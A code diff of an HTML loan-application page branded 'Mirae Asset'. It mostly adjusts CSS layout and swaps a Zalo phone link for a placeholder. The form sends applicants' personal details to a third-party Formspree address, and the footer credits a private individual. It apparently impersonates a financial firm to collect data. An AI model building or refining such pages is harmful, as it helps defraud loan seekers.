@@ -5,6 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Đăng Ký Vay - Mirae Asset</title>
   <style>
+    *, *:before, *:after {
+      box-sizing: border-box;
+    }
+
     body {
       font-family: Arial, sans-serif;
       background: linear-gradient(135deg, #004a99, #00aaff);
@@ -14,22 +18,25 @@
       align-items: center;
       min-height: 100vh;
       margin: 0;
-      position: relative;
+      padding: 20px;
     }
+
     form {
       background: #fff;
-      padding: 30px;
+      padding: 30px 20px;
       border-radius: 12px;
       box-shadow: 0 8px 20px rgba(0,0,0,0.2);
       max-width: 420px;
       width: 100%;
       text-align: center;
     }
+
     h2 {
-      text-align: center;
       margin-bottom: 20px;
       color: #004a99;
+      font-size: 20px;
     }
+
     input, button {
       width: 100%;
       padding: 12px;
@@ -38,6 +45,7 @@
       border-radius: 6px;
       font-size: 16px;
     }
+
     button {
       background: #004a99;
       color: #fff;
@@ -45,25 +53,35 @@
       cursor: pointer;
       transition: background 0.3s;
     }
+
     button:hover {
       background: #0066cc;
     }
+
     label {
       font-weight: bold;
       color: #333;
+      display: block;
+      text-align: left;
+      margin-top: 10px;
     }
+
     .note {
       font-size: 14px;
       color: #333;
       text-align: center;
       margin-top: 10px;
     }
+
     footer {
       margin-top: 20px;
       text-align: center;
       color: #fff;
-      font-size: 14px;
+      font-size: 13px;
+      line-height: 1.4;
+      max-width: 90%;
     }
+
     .zalo-floating {
       position: fixed;
       bottom: 20px;
@@ -79,15 +97,32 @@
       z-index: 999;
       cursor: pointer;
     }
+
     .zalo-floating img {
       width: 35px;
       height: 35px;
+    }
+
+    @media(max-width: 480px) {
+      h2 {
+        font-size: 18px;
+      }
+
+      input, button {
+        font-size: 15px;
+        padding: 10px;
+      }
+
+      .note {
+        font-size: 13px;
+      }
     }
   </style>
 </head>
 <body>
   <form action="https://formspree.io/f/xanbnrnk" method="POST" target="_blank">
     <h2>Đăng Ký Vay Mirae Asset</h2>
+
     <label>Họ và tên:</label>
     <input type="text" name="Họ và tên" placeholder="Nhập họ tên" required />
 
@@ -105,11 +140,11 @@
   </form>
 
   <footer>
-    © Copyright 2025 Võ Quốc Thiên. Giải Pháp Vay Tiêu Dùng Uy Tín & Linh Hoạt
+    © Copyright 2025 Võ Quốc Thiên.<br>Giải Pháp Vay Tiêu Dùng Uy Tín & Linh Hoạt
   </footer>
 
   <!-- Nút Zalo nổi góc phải -->
-  <a href="https://zalo.me/0964307247" target="_blank" class="zalo-floating">
+  <a href="https://zalo.me/YOUR_ZALO_ID" target="_blank" class="zalo-floating">
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Icon_of_Zalo.svg/1024px-Icon_of_Zalo.svg.png" alt="Chat Zalo">
   </a>
 
